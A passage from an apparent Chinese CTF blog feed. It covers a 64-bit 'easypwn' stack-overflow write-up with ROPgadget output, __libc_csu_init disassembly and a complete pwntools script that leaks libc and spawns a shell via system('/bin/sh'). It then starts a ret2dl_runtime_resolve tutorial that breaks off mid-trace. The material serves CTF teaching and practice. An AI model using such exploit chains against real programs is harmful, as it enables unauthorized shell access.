0xdff800007ffff7a1</span><br></pre></td></tr></table></figure><p>我们可以发现函数的返回地址就是如下图所示，且即将被覆盖，超过<strong>0x18</strong>字节即会覆盖返回地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1</span><br></pre></td></tr></table></figure><p>由于程序设置了栈不可执行，可以构造<strong>ROP</strong>链，泄露<strong>libc</strong>中的函数</p><p><strong>64</strong>位程序和我们之前一直做的<strong>32</strong>位程序在传参数方式上有很大的不同</p><p><strong>64</strong>位和<strong>32</strong>位的区别主要有两点：首先是内存地址的范围由<strong>32</strong>位变成了<strong>64</strong>位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，<strong>x86</strong>中参数都是保存在栈上,但在x64中的前六个参数依次保存在<strong>RDI</strong>, <strong>RSI</strong>, <strong>RDX</strong>, <strong>RCX</strong>,<strong>R8</strong>和 <strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</p><p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<strong>gadget</strong>，</p><p>由于<strong>sub_4006C6</strong>拷贝时，会被<strong>\x00</strong>截断，所以不能连续覆盖多个地址来<strong>ROP</strong>，</p><p>在<strong>sub_4006C6</strong>函数<strong>ret</strong>处下断点，调试可以发现<strong>sub_4006C6</strong>返回地址下方即为<strong>read</strong>时的<strong>buf</strong>处</p><p>所以可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p><p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p><p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p><p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p><p>所以我们直接只用<strong>ROP gadgets</strong>工具寻找64位环境下可以使用的<strong>gadgets</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/Untitled Folder$ ROPgadget --binary easypwn</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400622 : adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061e : adc dword ptr [rbp - 0x41], ebx ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007ef : add bl, dh ; ret</span><br><span class="line">0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x000000000040076d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040076e : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x000000000040053b : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040076f : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ee : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400698 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x0000000000400770 : add cl, cl ; ret</span><br><span class="line">0x0000000000400694 : add eax, 0x2009de ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400699 : add ebx, esi ; ret</span><br><span class="line">0x000000000040053e : add esp, 8 ; ret</span><br><span class="line">0x000000000040053d : add rsp, 8 ; ret</span><br><span class="line">0x0000000000400697 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007c9 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007ca : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x00000000004006be : call rax</span><br><span class="line">0x00000000004006fa : dec ecx ; ret</span><br><span class="line">0x0000000000400695 : fimul word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x00000000004006b9 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x000000000040061d : je 0x400638 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x000000000040066b : je 0x400680 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004006b8 : je 0x4006b1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400625 : jmp rax</span><br><span class="line">0x00000000004006fb : leave ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400628 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004007e8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400675 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400696 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040066c : or ebx, dword ptr [rbp - 0x41] ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x0000000000400621 : pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x0000000000400692 : pop rbp ; mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040061f : pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ba : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line">0x0000000000400296 : retf</span><br><span class="line">0x000000000040066a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004006b7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040062a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000004006b6 : test eax, eax ; je 0x4006b3 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004006b5 : test rax, rax ; je 0x4006b4 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 69</span><br></pre></td></tr></table></figure><p>不过这样子有点太乱了，我们一般只需要使用<strong>pop</strong>、<strong>ret</strong>、<strong>mov</strong>类型的<strong>gadgets</strong>，所以我们再查一查</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/easypwn$ ROPgadget --binary easypwn --only "pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br></pre></td></tr></table></figure><p> 其实这题有坑，其实是存在我们常用的<strong>gadgets</strong>的，只是工具没有搜索出来，然后也没有标识<strong>__libc_csu_init()</strong>这个函数，就需要我们自己多去看看题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400780</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400780</span>                 push    r15</span><br><span class="line">.text:<span class="number">0000000000400782</span>                 push    r14</span><br><span class="line">.text:<span class="number">0000000000400784</span>                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">0000000000400787</span>                 push    r13</span><br><span class="line">.text:<span class="number">0000000000400789</span>                 push    r12</span><br><span class="line">.text:<span class="number">000000000040078B</span>                 lea     r12, off_600E10</span><br><span class="line">.text:<span class="number">0000000000400792</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400793</span>                 lea     rbp, off_600E18</span><br><span class="line">.text:<span class="number">000000000040079</span>A                 push    rbx</span><br><span class="line">.text:<span class="number">000000000040079B</span>                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">000000000040079</span>E                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004007</span>A1                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004007</span>A4                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>A8                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004007</span>AC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004007B</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004007B</span>4                 jz      <span class="keyword">short</span> loc_4007D6</span><br><span class="line">.text:<span class="number">00000000004007B</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004007B</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">00000000004007</span>C0</span><br><span class="line">.text:<span class="number">00000000004007</span>C0 loc_4007C0:                             ; CODE XREF: init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">00000000004007</span>C0                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004007</span>C3                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004007</span>C6                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004007</span>C9                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000000004007</span>CD                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004007</span>D1                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>D4                 jnz     <span class="keyword">short</span> loc_4007C0</span><br><span class="line">.text:<span class="number">00000000004007</span>D6</span><br><span class="line">.text:<span class="number">00000000004007</span>D6 loc_4007D6:                             ; CODE XREF: init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">00000000004007</span>D6                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>DA                 pop     rbx</span><br><span class="line">.text:<span class="number">00000000004007</span>DB                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>DC                 pop     r12</span><br><span class="line">.text:<span class="number">00000000004007</span>DE                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004007E0</span>                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004007E2</span>                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004007E4</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004007E4</span> ; &#125; <span class="comment">// starts at 400780</span></span><br></pre></td></tr></table></figure><p>然后就是套路模板EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./easypwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4006FD</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007E3</span><span class="comment"># pop rdi ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x4007DC</span><span class="comment"># pop r12 r13 r14 r15</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x4007DA</span><span class="comment"># pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x4007C0</span></span><br><span class="line"><span class="comment">#mov rdx, r13 mov rsi, r14 mov di, r15d  call qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to CTF\n"</span>)</span><br><span class="line"></span><br><span class="line">    got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">    payload=<span class="number">0x18</span>*<span class="string">"a"</span> + p64(pop4_r12_ret)</span><br><span class="line"></span><br><span class="line">    payload+=p64(pop6_rbx_ret)+ p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(got_write)</span><br><span class="line">    payload+=p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">1</span>)  + p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload+=<span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    io.recvuntil(<span class="number">0x18</span>*<span class="string">"a"</span>)</span><br><span class="line">    io.recv(<span class="number">3</span>)</span><br><span class="line">    write_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>+hex(write_addr)</span><br><span class="line">    libc_base_addr=write_addr-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>+hex(libc_base_addr)</span><br><span class="line">    system_addr=libc_base_addr+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">    </span><br><span class="line">    bbs_addr = elf.bss()</span><br><span class="line">    </span><br><span class="line">    payload =  <span class="number">0x18</span>*<span class="string">"a"</span></span><br><span class="line">    payload += p64(pop4_r12_ret)</span><br><span class="line">    payload += p64(pop6_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">8</span>) + p64(bbs_addr) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(bbs_addr)</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to CTF\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高级ROP-ret2dl_runtime之通杀详解</title>
      <link href="/2019/09/14/%E2%95%95%E2%96%80%E2%95%9D%E2%95%A2ROP-ret2dl-runtime%E2%95%93%C2%AB%E2%95%90%C2%BF%E2%95%94%E2%96%92%E2%95%A7%CE%A9%E2%95%9C%CE%93/"/>
      <url>/2019/09/14/%E2%95%95%E2%96%80%E2%95%9D%E2%95%A2ROP-ret2dl-runtime%E2%95%93%C2%AB%E2%95%90%C2%BF%E2%95%94%E2%96%92%E2%95%A7%CE%A9%E2%95%9C%CE%93/</url>
      
        <content type="html"><![CDATA[<p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p><h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><p>先推荐几个地址学习下</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" target="_blank" rel="noopener">ctf-wiki之高级ROP</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" target="_blank" rel="noopener">ctf-wiki之elf文件基本结构</a></li></ul><p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的栈溢出<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" alt="img"></a><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p><p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">控制程序执行 dl_resolve 函数</span><br><span class="line">    给定 Link_map 以及 index 两个参数。</span><br><span class="line">    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。</span><br><span class="line">控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</span><br><span class="line">伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</span><br><span class="line">伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</span><br></pre></td></tr></table></figure><p>此外，这个攻击成功的很必要的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</span><br><span class="line">dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure><p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048390  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;0x804a00c&gt;</span><br><span class="line"></span><br><span class="line">   0x8048396  &lt;read@plt+6&gt;                push   0</span><br><span class="line">   0x804839b  &lt;read@plt+11&gt;               jmp    0x8048380</span><br><span class="line">    ↓</span><br><span class="line">   0x8048380                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048386                              jmp    dword ptr [0x804a008] &lt;0xf7fe96c0&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fe96c0 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fe96c1 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fe96c2 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fe96c3 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fe96c7 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fe96cb &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup 